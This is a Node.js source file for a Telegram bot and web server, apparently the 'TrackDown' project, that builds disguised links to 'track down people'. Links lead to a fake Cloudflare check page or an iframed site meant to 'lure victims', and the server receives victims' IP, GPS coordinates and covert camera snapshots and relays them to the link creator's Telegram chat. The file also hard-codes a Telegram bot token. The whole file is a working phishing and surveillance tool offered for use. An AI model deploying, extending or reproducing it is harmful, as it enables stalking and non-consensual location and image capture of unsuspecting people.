const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot("6908042604:AAFfO9vaVSB_8PXA2I4Pxfpr-WNHRA7I1uA", { polling: true });

const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Modify your URL here
const hostURL = "https://trackdown-k1l1.onrender.com";
// TOGGLE for Shorteners
const use1pt = true;

app.get("/w/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(",")[0] : req.connection?.remoteAddress || req.ip;
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  
  if (req.params.path) {
    res.render("webview", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(",")[0] : req.connection?.remoteAddress || req.ip;
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  
  if (req.params.path) {
    res.render("cloudflare", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text); 
  }
  
  if (msg.text === "/start") {
    const m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
    };

    bot.sendMessage(chatId, `Welcome ${msg.chat.first_name}!\nYou can use this bot to track down people just through a simple link.\nIt can gather information like location, device info, camera snaps.\n\nType /help for more info.`, m);
  } else if (msg.text === "/create") {
    createNew(chatId);
  } else if (msg.text === "/help") {
    bot.sendMessage(chatId, `Through this bot, you can track people just by sending a simple link.\n\nSend /create to begin. It will ask you for a URL to use in an iframe to lure victims.\nAfter receiving the URL, it will send you 2 links to track people.\n\nSpecifications:\n1. Cloudflare Link: Shows a Cloudflare under attack page to gather information and then redirects the victim to the destination URL.\n2. WebView Link: Displays a website (e.g., Bing, dating sites) using an iframe for gathering information.\n(⚠️ Many sites may not work under this method if they have the x-frame header present, e.g., https://google.com)\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown`);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  } 
});

bot.on('polling_error', (error) => {
  console.log(error.code); 
});

async function createLink(cid, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
    const url = `${cid.toString(36)}/${btoa(msg)}`;
    const m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]] })
    };

    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;
    
    bot.sendChatAction(cid, "typing");

    if (use1pt) {
      const x = await fetch(`https://short-link-api.vercel.app/?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
      const y = await fetch(`https://short-link-api.vercel.app/?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

      // Process and format URLs with space between them
            var f = x.urls.join("\n\n");
            var g = y.urls.join("\n\n");
      for (const c in x) {
        f += x[c] + "\n";
      }

      for (const c in y) {
        g += y[c] + "\n";
      }
      
      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
    } else {
      bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
    }
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL, including http or https.`);
    createNew(cid);
  }
}

function createNew(cid) {
  const mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
  const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(",")[0] : req.connection?.remoteAddress || req.ip;
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (lon !== null && lat !== null && uid !== null && acc !== null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  } else {
    res.send("Invalid data");
  }
});

app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  let data = decodeURIComponent(req.body.data) || null; 

  if (uid !== null && data !== null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.send("Invalid data");
  }
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;

  if (uid !== null && img !== null) {
    const buffer = Buffer.from(img, 'base64');
    const info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      res.send("Done");
    } catch (error) {
      console.log(error);
      res.send("Error sending photo");
    }
  } else {
    res.send("Invalid data");
  }
});

app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
